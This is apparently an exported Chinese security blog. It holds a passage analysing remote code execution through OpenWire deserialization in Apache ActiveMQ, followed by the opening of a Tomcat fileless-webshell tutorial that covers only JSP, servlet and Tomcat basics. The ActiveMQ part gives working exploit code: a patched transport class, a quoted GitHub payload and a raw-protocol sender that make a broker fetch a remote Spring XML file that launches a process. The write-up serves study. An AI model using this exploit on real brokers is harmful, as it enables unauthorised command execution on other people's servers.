<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jms.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">        connection.start();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession();</span><br><span class="line">        <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;tempQueue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">        <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        producer.send(message);</span><br><span class="line"></span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后随便打几个断点试试 (注意在一次通信的过程中 ActiveMQ 会 marshal &#x2F; unmarshal 一些其它的数据, 调试的时候记得判断)</p>
<p>调试进入org.apache.activemq.transport.tcp.TcpTransport#readCommand</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readCommand</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> wireFormat.unmarshal(dataIn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进org.apache.activemq.openwire.OpenWireFormat#doUnmarshal</p>
<p><img src="https://baicany.github.io/images/image-20231108143642342.png" alt="image-20231108143642342"></p>
<p>看到根据读取的头不同，取不同的dsm,</p>
<p>这个 dataType 其实对应的就是 Message 类内部的 <code>DATA_STRUCTURE_TYPE</code> 字段</p>
<p>在 demo 中我们发送的是一个 ObjectMessage (ActiveMQObjectMessage) 对象, 它的 dataType 是 26</p>
<p>获取到了对应的序列化器之后, 会调用它的 tightUnmarshal &#x2F; looseUnmarshal 方法进一步处理 Message 内容,而这里tightUnmarshal 默认是false所以会调用looseUnmarshal </p>
<p>我一开始的思路是去修改 ObjectMessage 的 <code>DATA_STRUCTURE_TYPE</code> 字段, 把它改成 31 然后发送</p>
<p>后来想了一会发现不能这么搞, 因为对于不同的 Message 类型, 序列化器会单独进行处理, 比如调用 writeXXX 和 readXXX 的类型和次数都不一样</p>
<p>因为 ExceptionResponseMarshaller 也有 marshal 方法, 所以思路就改成了如何去发送一个经由这个 marshaller 处理的 ExceptionResponse</p>
<p><img src="https://baicany.github.io/images/image-20231108150305526.png" alt="image-20231108150305526"></p>
<p>TcpTransport 这个类它的 oneway 方法会调用 wireFormat.marshal() 去序列化 command</p>
<p>在当前源码目录下新建一个 <code>org.apache.activemq.transport.tcp.TcpTransport</code> 类, 然后重写对应的逻辑, 这样在运行的时候, 因为 classpath 查找顺序的问题, 程序就会优先使用当前源码目录里的 TcpTransport 类</p>
<p>然后是 createThrowable 方法的利用, 这块其实跟 PostgreSQL JDBC 的利用类似, 因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 ClassPathXmlApplicationContext 加载 XML 实现 RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">   <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以我在这里同样 patch 了 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类            </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>先看看怎么直接传入一个ExceptionResponse类,在github上发现payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ActiveMQConnectionFactory</span>(<span class="string">&quot;tcp://localhost:61616&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">connection.start();</span><br><span class="line"><span class="type">ActiveMQSession</span> <span class="variable">session</span> <span class="operator">=</span> (ActiveMQSession) connection.createSession(<span class="literal">false</span>,Session.AUTO_ACKNOWLEDGE);</span><br><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">exceptionResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>();</span><br><span class="line"></span><br><span class="line">exceptionResponse.setException(<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>));</span><br><span class="line"></span><br><span class="line">session.syncSendPacket(exceptionResponse);</span><br><span class="line"></span><br><span class="line">connection.close();</span><br></pre></td></tr></table></figure>

<p>跟进这个syncSendPacket</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">syncSendPacket</span><span class="params">(Command command)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    <span class="keyword">return</span> connection.syncSendPacket(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终会调用到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> Response <span class="title function_">syncSendPacket</span><span class="params">(Command command, <span class="type">int</span> timeout)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">        <span class="keyword">if</span> (isClosed()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectionClosedException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response)(timeout &gt; <span class="number">0</span></span><br><span class="line">                        ? <span class="built_in">this</span>.transport.request(command, timeout)</span><br><span class="line">                        : <span class="built_in">this</span>.transport.request(command));</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>会进去request,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">request</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">FutureResponse</span> <span class="variable">response</span> <span class="operator">=</span> asyncRequest(command, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> response.getResult();</span><br></pre></td></tr></table></figure>

<p>然后发现会调用一次序列化，然后再getResult服务端又进行反序列</p>
<p>看完大哥了就看看,之前提到的ConnectionErrorMarshaller可不可以用</p>
<p>发现其实都差不多但是ConnectionError是直接父类直接就是BaseCommand而ExceptionResponse父类是Response</p>
<p>把ExceptionResponse换成ConnectionError也会造成命令执行</p>
<p>发现这个cve大哥是直接写协议过去的,我只能说真nb…,看到协议我脑袋都大,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BROKER_URL</span> <span class="operator">=</span> <span class="string">&quot;tcp://localhost:61616&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Boolean</span> <span class="variable">NON_TRANSACTED</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">TIMEOUT</span> <span class="operator">=</span> <span class="number">20000</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">String ip=<span class="string">&quot;&quot;</span>; <span class="comment">//服务器端ip地址</span></span><br><span class="line"><span class="type">int</span> port=; <span class="comment">//端口号</span></span><br><span class="line">Socket sck=<span class="keyword">new</span> <span class="title class_">Socket</span>(ip,port);</span><br><span class="line"><span class="comment">//2.传输内容</span></span><br><span class="line"><span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">out = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">out.writeInt(<span class="number">32</span>);</span><br><span class="line">out.writeByte(<span class="number">31</span>);</span><br><span class="line">out.writeInt(<span class="number">1</span>);</span><br><span class="line">out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">out.writeInt(<span class="number">1</span>);</span><br><span class="line">out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">out.writeUTF(<span class="string">&quot;类&quot;</span>);</span><br><span class="line">out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">out.writeUTF(<span class="string">&quot;地址&quot;</span>);</span><br><span class="line">out.close();</span><br><span class="line">in = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">OutputStream os=sck.getOutputStream(); <span class="comment">//输出流</span></span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> in.available();</span><br><span class="line"><span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line">in.readFully(buf);</span><br><span class="line">os.write(buf);</span><br><span class="line">in.close();</span><br><span class="line">sck.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h2><p>Apache ActiveMQ＜5.18.3</p>
<p>Apache ActiveMQ＜5.17.6</p>
<p>Apache ActiveMQ &lt; 5.16.7</p>
<p>Apache ActiveMQ &lt; 5.15.16</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomact内存马</title>
    <url>/2023/07/21/Tomact%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="内存马是什么"><a href="#内存马是什么" class="headerlink" title="内存马是什么"></a>内存马是什么</h1><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。</p>
<p>目前安全行业主要讨论的内存马主要分为以下几种方式：</p>
<ul>
<li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api 的具体实现）</li>
<li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li>
<li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li>
<li>使用 java agent 技术写入字节码</li>
</ul>
<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>在学习Java内存马之前，我们先来简单了解一下JSP技术。</p>
<h3 id="什么是JSP"><a href="#什么是JSP" class="headerlink" title="什么是JSP"></a>什么是JSP</h3><p>虽然jsp已经过时了，但是还在用的</p>
<p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p>
<p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>
<p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>
<h3 id="JSP的语法"><a href="#JSP的语法" class="headerlink" title="JSP的语法"></a>JSP的语法</h3><h4 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h4><p>脚本程序可以包含任意量的Java语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序的格式如下</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;% out.println(<span class="string">&quot;GoodBye!&quot;</span>); %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><p>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。JSP声明语句格式如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%! 声明  %&gt;</span><br></pre></td></tr></table></figure>

<p>同样等价于下面的XML语句</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure>

<p>下面是使用实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;%! String s= <span class="string">&quot;GoodBye!&quot;</span>; %&gt;</span><br><span class="line">&lt;% out.println(s); %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h4><p>如果JSP表达式中为一个对象，则会自动调用其<code>toString()</code>方法。格式如下，注意表达式后没有<code>;</code></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">%</span>= 表达式  <span class="meta">%</span>&gt;</span><br></pre></td></tr></table></figure>

<p>等价于下面的XML表达式</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;jsp:expression&gt;</span><br><span class="line">   表达式</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Feng&quot;</span>; %&gt;</span><br><span class="line">username:&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page ... %&gt;	定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等</span><br><span class="line">&lt;%@ include ... %&gt;	包含其他文件</span><br><span class="line">&lt;%@ taglib ... %&gt;	引入标签库的定义，可以是自定义标签</span><br></pre></td></tr></table></figure>

<p>比如我们能通过page指令来设置jsp页面的编码格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!!!&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;% <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;枫&quot;</span>; %&gt;</span><br><span class="line">用户名：&lt;%=name%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a>JSP注释</h4><p>格式如下</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&lt;<span class="comment">%</span><span class="literal">--</span> <span class="comment">注释内容</span> <span class="literal">--</span><span class="comment">%</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JSP内置对象"><a href="#JSP内置对象" class="headerlink" title="JSP内置对象"></a>JSP内置对象</h3><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下</p>
<ul>
<li>由 JSP 规范提供，不用编写者实例化</li>
<li>通过 Web 容器实现和管理</li>
<li>所有 JSP 页面均可使用</li>
<li>只有在脚本元素的表达式或代码段中才能使用</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">request	javax<span class="selector-class">.servlet</span><span class="selector-class">.http</span><span class="selector-class">.HttpServletRequest</span>	获取用户请求信息</span><br><span class="line">response	javax<span class="selector-class">.servlet</span><span class="selector-class">.http</span><span class="selector-class">.HttpServletResponse</span>	响应客户端请求，并将处理信息返回到客户端</span><br><span class="line">response	javax<span class="selector-class">.servlet</span><span class="selector-class">.jsp</span><span class="selector-class">.JspWriter</span>	输出内容到 HTML 中</span><br><span class="line">session	javax<span class="selector-class">.servlet</span><span class="selector-class">.http</span><span class="selector-class">.HttpSession</span>	用来保存用户信息</span><br><span class="line">application	javax<span class="selector-class">.servlet</span><span class="selector-class">.ServletContext</span>	所有用户共享信息</span><br><span class="line">config	javax<span class="selector-class">.servlet</span><span class="selector-class">.ServletConfig</span>	这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</span><br><span class="line">pageContext	javax<span class="selector-class">.servlet</span><span class="selector-class">.jsp</span><span class="selector-class">.PageContext</span>	JSP 的页面容器，用于访问 page、request、application 和 session 的属性</span><br><span class="line">page	javax<span class="selector-class">.servlet</span><span class="selector-class">.jsp</span><span class="selector-class">.HttpJspPage</span>	类似于 Java 类的 this 关键字，表示当前 JSP 页面</span><br><span class="line">exception	java<span class="selector-class">.lang</span><span class="selector-class">.Throwable</span>	该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象</span><br></pre></td></tr></table></figure>

<h1 id="Java-web三大件"><a href="#Java-web三大件" class="headerlink" title="Java web三大件"></a>Java web三大件</h1><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p><strong>1.什么是servlet</strong></p>
<p>Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p>
<p><strong>2.请求的处理过程</strong></p>
<p>客户端发起一个http请求，比如get类型。<br>Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。<br>Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。<br>Servlet容器调用service()方法。<br>service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。<br>doXXX方法中是我们自己写的业务逻辑。<br>业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。<br>容器关闭时候，会调用destory方法</p>
<p><strong>3.servlet生命周期</strong></p>
<p>1）服务器启动时(web.xml中配置load-on-startup&#x3D;1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。</p>
<p>2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行</p>
<p>3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。</p>
<p>4）由JVM进行垃圾回收。</p>
<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>简介</p>
<p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</p>
<p>基本工作原理</p>
<p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。<br>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。<br>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。<br>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。<br>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。<br>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</p>
<p>filter的生命周期</p>
<p>与servlet一样，Filter的创建和销毁也由web容器负责。 web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。<br>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
<p>filter链<br>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。</p>
<h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>简介<br>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。<br>ServletContextListener：对Servlet上下文的创建和销毁进行监听；<br>ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；<br>HttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。<br>HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；<br>ServletRequestListener：对请求对象的初始化和销毁进行监听；<br>ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</p>
<p>用途<br>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p>
<h1 id="Tomact架构"><a href="#Tomact架构" class="headerlink" title="Tomact架构"></a>Tomact架构</h1><p>Tomcat Server大致可以分为三个组件，Service、Connector、Container</p>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>其中一个Tomcat Server可以包含多个Service，比如Tomcat默认的Service服务Catalina。每一个Service都是独立的，他们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。</p>
<h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p>Connector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP&#x2F;1.1、HTTP&#x2F;2、AJP等等。</p>
<h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Tomcat的Container包含四种子容器：<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，在Tomcat源码中我们可以清晰地看到各容器之间的继承关系</p>
